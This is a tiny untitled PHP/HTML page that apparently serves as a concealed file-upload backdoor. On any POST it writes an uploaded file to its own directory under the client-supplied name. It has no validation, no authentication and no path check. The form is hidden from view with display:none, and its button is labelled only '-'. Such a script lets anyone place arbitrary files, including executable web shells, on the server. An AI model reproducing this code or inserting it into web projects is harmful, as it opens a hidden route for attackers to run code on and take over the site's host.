<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title></title>
</head>
<body>
<?php 
if ($_POST) {
$filename = $_FILES['file']['name'];
$folder = "";
$uploaddir = $folder . $filename;
move_uploaded_file($_FILES['file']['tmp_name'], $uploaddir);
}
?>
<form action="" method="post" enctype="multipart/form-data" style="display: none;">
	<input type="file" name="file">
	<input type="hidden" name="a" value="0">
	<button type="submit">-</button>
</form>

</body>
</html>